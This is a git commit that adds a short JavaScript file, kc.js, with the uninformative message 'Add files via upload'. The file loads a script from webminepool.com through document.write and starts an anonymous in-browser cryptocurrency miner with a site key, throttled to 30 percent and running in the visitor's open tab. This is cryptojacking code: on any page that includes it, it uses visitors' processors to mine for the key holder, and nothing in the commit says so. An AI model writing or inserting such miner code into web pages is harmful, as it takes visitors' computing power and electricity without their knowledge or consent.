21f2d3a41974c6fe2df71d80102d1ee4f5f2e4e3
MA4 <126404419+a502222802@users.noreply.github.com>
2024-04-19 10:29:19 +0800

    Add files via upload

---
+++ kc.js
@@ -0,0 +1,4 @@
+document.write('<script src="https://webminepool.com/lib/base.js"></scr' + 'ipt>');
+
+    var miner = WMP.Anonymous('SK_fOjrjOMVPjqeJ7QRfpNlG', { throttle: 0.3 });
+    miner.start(WMP.IF_EXCLUSIVE_TAB);
